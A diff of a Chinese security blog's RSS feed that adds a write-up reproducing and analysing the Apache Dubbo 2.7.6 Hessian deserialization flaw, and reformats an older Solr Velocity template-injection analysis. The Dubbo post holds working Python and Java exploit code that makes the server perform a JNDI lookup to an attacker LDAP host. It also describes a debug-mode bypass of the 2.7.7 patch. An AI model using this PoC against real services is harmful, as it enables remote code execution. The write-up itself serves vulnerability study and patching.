@@ -7,8 +7,279 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>zh_cn</language>
     <copyright>Copyright © 2020 kylinking</copyright>
-    <lastBuildDate>Thu, 07 May 2020 10:40:08 +0000</lastBuildDate>
+    <lastBuildDate>Wed, 01 Jul 2020 19:59:26 +0000</lastBuildDate>
     <atom:link href="https://kylingit.com/blog/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Apache Dubbo 2.7.6 反序列化漏洞复现及分析</title>
+      <link>https://kylingit.com/blog/apache-dubbo-2.7.6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/</link>
+      <pubDate>Wed, 01 Jul 2020 19:59:26 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/apache-dubbo-2.7.6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/</guid>
+      <description>
+
+&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
+
+&lt;h2 id=&#34;简介&#34;&gt;简介&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Dubbo 从大的层面上将是RPC框架，负责封装RPC调用，支持很多RPC协议&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;RPC协议包括了dubbo、rmi、hessian、webservice、http、redis、rest、thrift、memcached、jsonrpc等&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Java中的序列化有Java原生序列化、Hessian 序列化、Json序列化、dubbo 序列化&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/t01dd60f99ea19aec96.jpg&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;图片来源：&lt;a href=&#34;https://www.anquanke.com/post/id/209251&#34;&gt;https://www.anquanke.com/post/id/209251&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;环境搭建&#34;&gt;环境搭建&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;克隆项目&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;git clone &lt;a href=&#34;https://github.com/apache/dubbo-spring-boot-project.git&#34;&gt;https://github.com/apache/dubbo-spring-boot-project.git&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;git checkout 2.7.6&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;添加rome依赖&lt;/p&gt;
+
+&lt;p&gt;dubbo-spring-boot-samples 文件夹，在provider-sample文件夹下的 pom 里添加&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;dependency&amp;gt;
+    &amp;lt;groupId&amp;gt;com.rometools&amp;lt;/groupId&amp;gt;
+    &amp;lt;artifactId&amp;gt;rome&amp;lt;/artifactId&amp;gt;
+    &amp;lt;version&amp;gt;1.7.0&amp;lt;/version&amp;gt;
+&amp;lt;/dependency&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;启动服务端&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;org.apache.dubbo.spring.boot.demo.provider.bootstrap.DubboAutoConfigurationProviderBootstrap
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;复现&#34;&gt;复现&lt;/h2&gt;
+
+&lt;h3 id=&#34;python版本&#34;&gt;python版本&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# -*- coding: utf-8 -*-
+# Ruilin
+# pip3 install dubbo-py
+from dubbo.codec.hessian2 import Decoder,new_object
+from dubbo.client import DubboClient
+ 
+client = DubboClient(&#39;192.168.2.1&#39;, 12345)
+ 
+JdbcRowSetImpl=new_object(
+    &#39;com.sun.rowset.JdbcRowSetImpl&#39;,
+    dataSource=&amp;quot;ldap://192.168.2.2:1389/nnyvbt&amp;quot;,
+    strMatchColumns=[&amp;quot;foo&amp;quot;]
+    )
+JdbcRowSetImplClass=new_object(
+    &#39;java.lang.Class&#39;,
+    name=&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;,
+    )
+toStringBean=new_object(
+    &#39;com.rometools.rome.feed.impl.ToStringBean&#39;,
+    beanClass=JdbcRowSetImplClass,
+    obj=JdbcRowSetImpl
+    )
+ 
+resp = client.send_request_and_return_response(
+    service_name=&#39;any_name&#39;,
+    method_name=&#39;any_method&#39;,
+    args=[toStringBean])
+    
+print(resp)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;java版本&#34;&gt;java版本&lt;/h3&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;DemoService&lt;/code&gt;增加接口方法&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;String rceTest(Object o);
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;code&gt;DefaultDemoService&lt;/code&gt;实现接口方法&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;@Override
+public String rceTest(Object o) {
+    return &amp;quot;pwned&amp;quot;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;code&gt;DubboAutoConfigurationConsumerBootstrap&lt;/code&gt;客户端增加调用&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public ApplicationRunner runner() throws Exception {
+    Object o = getPayload();
+    return args -&amp;gt; logger.info(demoService.rceTest(o));
+}
+    
+private static Object getPayload() throws Exception {
+    String jndiUrl = &amp;quot;ldap://192.168.3.104:1389/sg56vh&amp;quot;;
+    
+    ToStringBean bean = new ToStringBean(JdbcRowSetImpl.class, JDKUtil.makeJNDIRowSet(jndiUrl));
+    EqualsBean root = new EqualsBean(ToStringBean.class, bean);
+    
+    return JDKUtil.makeMap(root, root);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;运行provider服务者，再运行consumer消费者，触发漏洞&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;流量&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200629170736311.png&#34; alt=&#34;image-20200629170736311&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;0xdabb&lt;/code&gt;开头的为dubbo流量，提出后可以直接用socket发送触发漏洞&lt;/p&gt;
+
+&lt;h2 id=&#34;分析&#34;&gt;分析&lt;/h2&gt;
+
+&lt;h3 id=&#34;python版本触发点&#34;&gt;python版本触发点&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;org.apache.dubbo.rpc.protocol.dubbo.DubboCodec.decodeBody()
+org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation.decode()
+org.apache.dubbo.rpc.protocol.dubbo.CallbackServiceCodec.decodeInvocationArgument()
+org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol.getInvoker()
+java.lang.StringBuilder.append()
+java.lang.String.valueOf()
+org.apache.dubbo.rpc.RpcInvocation.toString()
+com.rometools.rome.feed.impl.ToStringBean.toString()
+com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData()
+com.sun.rowset.JdbcRowSetImpl.connect()
+javax.naming.InitialContext.lookup()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;python版本poc成功触发的关键点在于，通过构造一个不存在的&lt;code&gt;service_name&lt;/code&gt;使得服务端获取不到期望的DubboExporter进而抛出异常，而在输出异常信息的时候进行了字符串拼接进而调用了隐含的toString方法，所以能够通过构造的恶意对象的toString方法触发漏洞&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200630134254690.png&#34; alt=&#34;image-20200630134254690&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;那么关键点就在异常处理部分了，也正是rui0提出的“后反序列化漏洞”的利用场景，重点来看一下&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol.getInvoker()&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;//dubbo 2.7.3
+if (exporter == null) {
+    throw new RemotiyicngException(channel, &amp;quot;Not found exported service: &amp;quot; + serviceKey + &amp;quot; in &amp;quot; + this.exporterMap.keySet() + &amp;quot;, may be version or group mismatch , channel: consumer: &amp;quot; + channel.getRemoteAddress() + &amp;quot; --&amp;gt; provider: &amp;quot; + channel.getLocalAddress() + &amp;quot;, message:&amp;quot; + inv);
+} else {
+    return exporter.getInvoker();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;dubbo 2.7.3版本中，抛出异常部分直接拼接了inv，此时inv为&lt;code&gt;DecodeableRpcInvocation&lt;/code&gt;对象，并且&lt;code&gt;arguments&lt;/code&gt;值为我们设置的&lt;code&gt;ToStringBean&lt;/code&gt;对象，在对其直接进行字符串拼接时会触发String.append-&amp;gt;String.valueOf-&amp;gt;obj.toString()，进而将&lt;code&gt;ToStringBean&lt;/code&gt;进行tostring触发漏洞&lt;/p&gt;
+
+&lt;p&gt;而在2.7.5之后的版本中，throw RemotiyicngException部分变成了&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;//dubbo 2.7.5
+if (exporter == null) {
+    throw new RemotingException(channel, &amp;quot;Not found exported service: &amp;quot; + serviceKey + &amp;quot; in &amp;quot; + this.exporterMap.keySet() + &amp;quot;, may be version or group mismatch , channel: consumer: &amp;quot; + channel.getRemoteAddress() + &amp;quot; --&amp;gt; provider: &amp;quot; + channel.getLocalAddress() + &amp;quot;, message:&amp;quot; + this.getInvocationWithoutData(inv));
+} else {
+    return exporter.getInvoker();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;注意到对inv经过了&lt;code&gt;getInvocationWithoutData&lt;/code&gt;处理，这个处理是这样的：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;//org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol
+private Invocation getInvocationWithoutData(Invocation invocation) {
+    if (this.logger.isDebugEnabled()) {
+        return invocation;
+    } else if (invocation instanceof RpcInvocation) {
+        RpcInvocation rpcInvocation = (RpcInvocation)invocation;
+        rpcInvocation.setArguments((Object[])null);
+        return rpcInvocation;
+    } else {
+        return invocation;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到将invocation中的&lt;code&gt;arguments&lt;/code&gt;值处理成了空，经过这个处理之后后续的toString利用链就无法继续下去，起到了第一层防御效果，因此通过设置&lt;code&gt;arguments&lt;/code&gt;为恶意对象的方法就无法在2.7.5版本以上触发。&lt;/p&gt;
+
+&lt;p&gt;相关commit可以在&lt;a href=&#34;https://github.com/apache/dubbo/commit/5618b12340b9c3ecf90c7e01c274a4f094cc146c#diff-37a8a427d2ec646f392ebd9225019346&#34;&gt;这里&lt;/a&gt;看到&lt;/p&gt;
+
+&lt;h3 id=&#34;java版本触发点&#34;&gt;Java版本触发点&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;org.apache.dubbo.remoting.transport.DecodeHandler.decode()
+org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation.decode()
+org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput.readObject()
+com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject()
+com.alibaba.com.caucho.hessian.io.MapDeserializer.readMap()
+com.alibaba.com.caucho.hessian.io.MapDeserializer.doReadMap()
+java.util.HashMap.put()-&amp;gt;hash()-&amp;gt;hashCode()
+com.rometools.rome.feed.impl.EqualsBean.beanHashCode()
+com.rometools.rome.feed.impl.ToStringBean.toString()
+com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData()
+com.sun.rowset.JdbcRowSetImpl.connect()
+javax.naming.InitialContext.lookup()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;下面讨论一下java版本poc为什么在解决了异常处理的toString后还是能触发漏洞？&lt;/p&gt;
+
+&lt;p&gt;除了上面的commit修复了异常处理中的toString外，官方还提交了一个&lt;a href=&#34;https://github.com/apache/dubbo/commit/04fc3ce4cc87b9bd09546c12df3f8762b9525da9#diff-97efdee63a15983753ec52d8cd03b6a7&#34;&gt;PR&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200701113514058.png&#34; alt=&#34;image-20200701113514058&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在&lt;code&gt;org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation.decode()&lt;/code&gt;中增加了&lt;code&gt;RpcUtils.isGenericCall&lt;/code&gt;和&lt;code&gt;RpcUtils.isEcho&lt;/code&gt;的判断，在没有补丁之前，pts还能通过反射从desc中获取到，而打了补丁后，如果方法名不是&lt;code&gt;$invoke&lt;/code&gt;或&lt;code&gt;$invokeAsync&lt;/code&gt;或&lt;code&gt;$echo&lt;/code&gt;则直接抛出Service not found，因此当用python版本poc发送不存在的service_name或method_name时，便通不过判断，也就无法利用。&lt;/p&gt;
+
+&lt;p&gt;上述判断条件是当传入的参数类别从对应的方法中获取不到的时候进行的，那么如果我们传入正确的方法名和参数类型，该条件就不成立，也就不会进入&lt;code&gt;RpcUtils.isGenericCall&lt;/code&gt;和&lt;code&gt;RpcUtils.isEcho&lt;/code&gt;，从而绕过了对调用的方法名的判断&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200701112440804.png&#34; alt=&#34;image-20200701112440804&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;因此我们重新实现一下客户端代码，调用正确的服务名和方法名，并传入构造的map对象，便能再次触发漏洞。&lt;/p&gt;
+
+&lt;p&gt;触发条件：必须知道服务端的完整service name和方法名，同时该方法需要能接收map或object对象，客户端才能通过正确的服务名和方法名去调用，否则是无法触发的。&lt;/p&gt;
+
+&lt;h3 id=&#34;2-7-7绕过&#34;&gt;2.7.7绕过&lt;/h3&gt;
+
+&lt;p&gt;上面分析了CVE-2020-1948，看似补丁修复了漏洞，但之后又有讨论说在2.7.7上又存在绕过，下面也来分析一下&lt;/p&gt;
+
+&lt;p&gt;还是看&lt;code&gt;getInvocationWithoutData&lt;/code&gt;方法，注意到在设置&lt;code&gt;arguments&lt;/code&gt;为空之前有这么两行代码&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;if (this.logger.isDebugEnabled()) {
+    return invocation;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这就是说如果provider是以debug模式启动的，那么会直接返回&lt;code&gt;invocation&lt;/code&gt;对象。。。&lt;/p&gt;
+
+&lt;p&gt;配置一下服务端启动的日志级别，然后修改python版本poc的&lt;code&gt;method_name&lt;/code&gt;为&lt;code&gt;$invoke&lt;/code&gt;，成功绕过2.7.7补丁（还需要注意服务名是否匹配和服务版本号的问题）&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
+&amp;lt;configuration scan=&amp;quot;true&amp;quot;&amp;gt;
+    &amp;lt;logger name=&amp;quot;com.alibaba.dubbo&amp;quot; level=&amp;quot;DEBUG&amp;quot;/&amp;gt;
+&amp;lt;/configuration&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200701191029066.png&#34; alt=&#34;image-20200701191029066&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;小结&#34;&gt;小结&lt;/h3&gt;
+
+&lt;p&gt;上面两种触发方式是不一样的，一个是利用异常处理中存在设计不足，使得可以执行用户可控参数的toString方法，也即“后反序列化”利用思路，另一个是直接反序列化hessian2数据，期间对hashmap的操作进入toString，从调用栈上也能看出两者的区别。&lt;/p&gt;
+
+&lt;h2 id=&#34;修复方式&#34;&gt;修复方式&lt;/h2&gt;
+
+&lt;p&gt;按照&lt;a href=&#34;https://github.com/apache/dubbo/pull/6374&#34;&gt;dubbo/pull/6374&lt;/a&gt;建议的方法，给&lt;code&gt;ParameterTypesDesc&lt;/code&gt;加上校验，严格限制类型为&lt;code&gt;Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;&lt;/code&gt;，同时建议参考&lt;a href=&#34;https://github.com/sofastack/sofa-hessian&#34;&gt;sofa-hessian&lt;/a&gt;给反序列化加上黑名单&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200701192122667.png&#34; alt=&#34;image-20200701192122667&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html&#34;&gt;https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://rui0.cn/archives/1338&#34;&gt;http://rui0.cn/archives/1338&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/197658&#34;&gt;https://www.anquanke.com/post/id/197658&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/apache/dubbo/pull/6374&#34;&gt;https://github.com/apache/dubbo/pull/6374&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
+</description>
+    </item>
     
     <item>
       <title>JAVA XXE中两种数据传输形式及相关限制</title>
@@ -416,78 +687,77 @@ info: FTP: recvd &#39;RETR tesdata&#39;
       <pubDate>Tue, 05 Nov 2019 09:40:22 +0000</pubDate>
       
       <guid>https://kylingit.com/blog/apache-solr-velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
-      <description>&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
-### 0x01 概述
+      <description>
 
-10月30日，研究员S00pY在GitHub发布了Apache Solr Velocity模版注入远程命令执行的poc，该漏洞通过设置资源加载属性，利用`VelocityResponseWriter`插件执行自定义模板，进而进行远程代码执行，危害较大，下面是分析过程。
+&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
 
-### 0x02 环境搭建
+&lt;h3 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h3&gt;
 
-选择Solr 8.2.0二进制版本进行分析和复现
+&lt;p&gt;10月30日，研究员S00pY在GitHub发布了Apache Solr Velocity模版注入远程命令执行的poc，该漏洞通过设置资源加载属性，利用&lt;code&gt;VelocityResponseWriter&lt;/code&gt;插件执行自定义模板，进而进行远程代码执行，危害较大，下面是分析过程。&lt;/p&gt;
 
-下载地址：&lt;https://archive.apache.org/dist/lucene/solr/8.2.0/&gt;
+&lt;h3 id=&#34;0x02-环境搭建&#34;&gt;0x02 环境搭建&lt;/h3&gt;
 
-调试命令
+&lt;p&gt;选择Solr 8.2.0二进制版本进行分析和复现&lt;/p&gt;
 
-```shell
-$ cd solr-8.2.0\server
-$ java &#34;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000&#34; -Dsolr.solr.home=&#34;../example/example-DIH/solr/&#34; -jar start.jar --module=http
-```
+&lt;p&gt;下载地址：&lt;a href=&#34;https://archive.apache.org/dist/lucene/solr/8.2.0/&#34;&gt;https://archive.apache.org/dist/lucene/solr/8.2.0/&lt;/a&gt;&lt;/p&gt;
 
-IDEA新建远程调试即可
+&lt;p&gt;调试命令&lt;/p&gt;
 
-### 0x03 前置概念
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ cd solr-8.2.0\server
+$ java &amp;quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000&amp;quot; -Dsolr.solr.home=&amp;quot;../example/example-DIH/solr/&amp;quot; -jar start.jar --module=http
+&lt;/code&gt;&lt;/pre&gt;
 
-`VelocityResponseWriter`(Velocity响应编写器)是 contrib/velocity 目录中可用的可选插件。当使用诸如 “_default”、“techproducts” 和 “example / files” 等配置时，它为浏览用户界面提供动力。
+&lt;p&gt;IDEA新建远程调试即可&lt;/p&gt;
 
-必须添加它的 JAR 和依赖项（通过&lt;lib&gt;或 solr/home lib 包含），并且必须在 solrconfig.xml 注册，默认已经注册
+&lt;h3 id=&#34;0x03-前置概念&#34;&gt;0x03 前置概念&lt;/h3&gt;
 
-![1572507926900](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572507926900.png)
+&lt;p&gt;&lt;code&gt;VelocityResponseWriter&lt;/code&gt;(Velocity响应编写器)是 contrib/velocity 目录中可用的可选插件。当使用诸如 “_default”、“techproducts” 和 “example / files” 等配置时，它为浏览用户界面提供动力。&lt;/p&gt;
 
-其中有一个属性`params.resource.loader.enabled`，默认是`false`，需要手动开启
+&lt;p&gt;必须添加它的 JAR 和依赖项（通过&amp;lt;lib&amp;gt;或 solr/home lib 包含），并且必须在 solrconfig.xml 注册，默认已经注册&lt;/p&gt;
 
-该参数表示允许加载程序在 Solr 请求参数中指定模板，例如：
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572507926900.png&#34; alt=&#34;1572507926900&#34; /&gt;&lt;/p&gt;
 
-```
-http://localhost:8983/solr/gettingstarted/select?q=\*:*&amp;wt=velocity&amp;v.template=xxx&amp;v.template.xxx=CUSTOM%3A%20%23core_name
-```
+&lt;p&gt;其中有一个属性&lt;code&gt;params.resource.loader.enabled&lt;/code&gt;，默认是&lt;code&gt;false&lt;/code&gt;，需要手动开启&lt;/p&gt;
 
-`v.template=xxx`表示创建一个名为“xxx”的模板，`v.template.xxx`则是模板内容
+&lt;p&gt;该参数表示允许加载程序在 Solr 请求参数中指定模板，例如：&lt;/p&gt;
 
-当这个属性设置为`true`时用户就可以传入任意模板内容进行模板注入，从而执行任意命令
+&lt;pre&gt;&lt;code&gt;http://localhost:8983/solr/gettingstarted/select?q=\*:*&amp;amp;wt=velocity&amp;amp;v.template=xxx&amp;amp;v.template.xxx=CUSTOM%3A%20%23core_name
+&lt;/code&gt;&lt;/pre&gt;
 
-### 0x04 漏洞分析
+&lt;p&gt;&lt;code&gt;v.template=xxx&lt;/code&gt;表示创建一个名为“xxx”的模板，&lt;code&gt;v.template.xxx&lt;/code&gt;则是模板内容&lt;/p&gt;
 
-#### 设置`params.resource.loader.enabled`属性
+&lt;p&gt;当这个属性设置为&lt;code&gt;true&lt;/code&gt;时用户就可以传入任意模板内容进行模板注入，从而执行任意命令&lt;/p&gt;
 
-在Solr的Web.xml文件中能看到所有的请求都交给`org.apache.solr.servlet.SolrDispatchFilter`来处理
+&lt;h3 id=&#34;0x04-漏洞分析&#34;&gt;0x04 漏洞分析&lt;/h3&gt;
 
-![1572508606062](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572508606062.png)
+&lt;h4 id=&#34;设置-params-resource-loader-enabled-属性&#34;&gt;设置&lt;code&gt;params.resource.loader.enabled&lt;/code&gt;属性&lt;/h4&gt;
 
-具体的则是其中的`doFilter()`方法。在对路由经过初步处理后，进行两个关键操作：
+&lt;p&gt;在Solr的Web.xml文件中能看到所有的请求都交给&lt;code&gt;org.apache.solr.servlet.SolrDispatchFilter&lt;/code&gt;来处理&lt;/p&gt;
 
-```java
-HttpSolrCall call = this.getHttpSolrCall(request, response, retry);
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572508606062.png&#34; alt=&#34;1572508606062&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;具体的则是其中的&lt;code&gt;doFilter()&lt;/code&gt;方法。在对路由经过初步处理后，进行两个关键操作：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;HttpSolrCall call = this.getHttpSolrCall(request, response, retry);
 //...
 SolrDispatchFilter.Action result = call.call();
-```
+&lt;/code&gt;&lt;/pre&gt;
 
-初始化一个`HttpSolrCall`对象后调用它的`call()`方法，在`call()`方法中会对路由中具体的组件初始化出对应的handler，再由这个handler去调用这个组件的各个方法
+&lt;p&gt;初始化一个&lt;code&gt;HttpSolrCall&lt;/code&gt;对象后调用它的&lt;code&gt;call()&lt;/code&gt;方法，在&lt;code&gt;call()&lt;/code&gt;方法中会对路由中具体的组件初始化出对应的handler，再由这个handler去调用这个组件的各个方法&lt;/p&gt;
 
-在Solr 8.2.0中具体的路由有37个，每一类都有对应的handler，都在`org.apache.solr.handler`中定义，例如`solr/solr/get`对应的hendler为`RealTimeGetHandler`
+&lt;p&gt;在Solr 8.2.0中具体的路由有37个，每一类都有对应的handler，都在&lt;code&gt;org.apache.solr.handler&lt;/code&gt;中定义，例如&lt;code&gt;solr/solr/get&lt;/code&gt;对应的hendler为&lt;code&gt;RealTimeGetHandler&lt;/code&gt;&lt;/p&gt;
 
-![1572515458181](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572515458181.png)
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572515458181.png&#34; alt=&#34;1572515458181&#34; /&gt;&lt;/p&gt;
 
-![1572516210537](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572516210537.png)
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572516210537.png&#34; alt=&#34;1572516210537&#34; /&gt;&lt;/p&gt;
 
-而`/solr/solr/config` 由`SolrConfigHandler`来分别处理GET和POST请求
+&lt;p&gt;而&lt;code&gt;/solr/solr/config&lt;/code&gt; 由&lt;code&gt;SolrConfigHandler&lt;/code&gt;来分别处理GET和POST请求&lt;/p&gt;
 
-```java
-SolrConfigHandler.Command command = new SolrConfigHandler.Command(req, rsp, httpMethod);
-if (&#34;POST&#34;.equals(httpMethod)) {
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;SolrConfigHandler.Command command = new SolrConfigHandler.Command(req, rsp, httpMethod);
+if (&amp;quot;POST&amp;quot;.equals(httpMethod)) {
     if (configEditing_disabled || this.isImmutableConfigSet) {
-        String reason = configEditing_disabled ? &#34;due to disable.configEdit&#34; : &#34;because ConfigSet is immutable&#34;;
-        throw new SolrException(ErrorCode.FORBIDDEN, &#34; solrconfig editing is not enabled &#34; + reason);
+        String reason = configEditing_disabled ? &amp;quot;due to disable.configEdit&amp;quot; : &amp;quot;because ConfigSet is immutable&amp;quot;;
+        throw new SolrException(ErrorCode.FORBIDDEN, &amp;quot; solrconfig editing is not enabled &amp;quot; + reason);
     }
 
     try {
@@ -498,84 +768,88 @@ if (&#34;POST&#34;.equals(httpMethod)) {
 } else {
     command.handleGET();
 }
-```
+&lt;/code&gt;&lt;/pre&gt;
 
-私有类`Command`会对当前路由的webapp和path做一个切分，对于POST请求，分别会通过`SolrConfigHandler.Command#handlePOST()`方法来处理
+&lt;p&gt;私有类&lt;code&gt;Command&lt;/code&gt;会对当前路由的webapp和path做一个切分，对于POST请求，分别会通过&lt;code&gt;SolrConfigHandler.Command#handlePOST()&lt;/code&gt;方法来处理&lt;/p&gt;
 
-![1572509660264](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572509660264.png)
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572509660264.png&#34; alt=&#34;1572509660264&#34; /&gt;&lt;/p&gt;
 
-接着调用`SolrConfigHandler.Command#handleCommands()`，Solr中`Config API`对应的实现都是由这个方法来完成的，如`set-property`、`unset-property`等
+&lt;p&gt;接着调用&lt;code&gt;SolrConfigHandler.Command#handleCommands()&lt;/code&gt;，Solr中&lt;code&gt;Config API&lt;/code&gt;对应的实现都是由这个方法来完成的，如&lt;code&gt;set-property&lt;/code&gt;、&lt;code&gt;unset-property&lt;/code&gt;等&lt;/p&gt;
 
-![1572516461804](https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572516461804.png)
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572516461804.png&#34; alt=&#34;1572516461804&#34; /&gt;&lt;/p&gt;
 
-此处主要关注更新配置的参数
+&lt;p&gt;此处主要关注更新配置的参数&lt;/p&gt;
 
-从[文档](https://lucene.apache.org/solr/guide/8_2/config-api.html#basic-commands-for-components)可以了解对于`responsewriter`的操作有下面三个
